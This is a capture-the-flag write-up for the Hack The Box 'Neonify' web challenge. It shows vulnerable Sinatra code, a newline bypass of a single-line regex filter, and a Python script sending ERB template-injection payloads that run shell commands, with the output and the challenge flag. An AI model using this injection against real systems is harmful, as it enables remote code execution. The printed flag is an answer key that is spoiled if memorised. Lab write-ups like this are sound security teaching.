# Web

## Description

It's time for a shiny new reveal for the first-ever text neonifier. Come test out our brand new website and make any text glow like a lo-fi neon tube!

URL: [https://app.hackthebox.com/challenges/Neonify](https://app.hackthebox.com/challenges/Neonify)
## Source

`/challenge/app/controllers/neon.rb`
```rb
class NeonControllers < Sinatra::Base

  configure do
    set :views, "app/views"
    set :public_dir, "public"
  end

  get '/' do
    @neon = "Glow With The Flow"
    erb :'index'
  end

  post '/' do
    if params[:neon] =~ /^[0-9a-z ]+$/i
      @neon = ERB.new(params[:neon]).result(binding)
    else
      @neon = "Malicious Input Detected"
    end
    erb :'index'
  end

end
```
## Solution

![neonify.png](/assets/ctf/htb/web/neonify.png)

The line is used in Ruby to evaluate a string of code using Embedded Ruby (ERB), but we are only allowed to use alphanumerical characters and space.
```rb
@neon = ERB.new(params[:neon]).result(binding)
```

The input is evaluated into
```rb
<h1 class="glow"><%= @neon %></h1>
```

[https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby)

The problem with the injection is the regex condition
```rb
    if params[:neon] =~ /^[0-9a-z ]+$/i
```

The condition doesn't check for multiline input, only for first line. If we inject new line and whatever our payload is it's not going get checked and essentially bypass whole filter.

```python
import requests
from bs4 import BeautifulSoup as BS

URL = 'http://94.237.62.252:48669/'

payload = 'x\n<%= 7*7 %>'
payload = 'x\n<%= `ls -alh` %>'
payload = 'x\n<%= `cat flag.txt` %>'

resp = requests.post(URL, data={'neon': payload})
output = BS(resp.text, 'html.parser').find('h1', class_='glow').get_text(strip=True)
print(output)
```

::: info Note
It's important to have something on first line so that regex is satisfied, empty string doesn't satisfy the condition.
:::

```powershell
➜ py .\exploit.py
x
49
➜ py .\exploit.py
x
total 36K
drwxr-xr-x    1 root     root        4.0K Mar 21  2022 .
drwxr-xr-x    1 root     root        4.0K Aug 28 19:07 ..
-rw-r--r--    1 root     root          76 Mar 10  2022 Gemfile
-rw-r--r--    1 root     root         471 Mar 21  2022 Gemfile.lock
drwxr-xr-x    4 root     root        4.0K Mar 10  2022 app
drwxr-xr-x    2 root     root        4.0K Mar 10  2022 config
-rw-r--r--    1 root     root          60 Mar 10  2022 config.ru
-rw-r--r--    1 root     root          25 Feb 26  2022 flag.txt
drwxr-xr-x    4 root     root        4.0K Feb 25  2022 public
➜ py .\exploit.py
x
HTB{r3pl4c3m3n7_s3cur1ty}
```

> Flag: `HTB{r3pl4c3m3n7_s3cur1ty}`

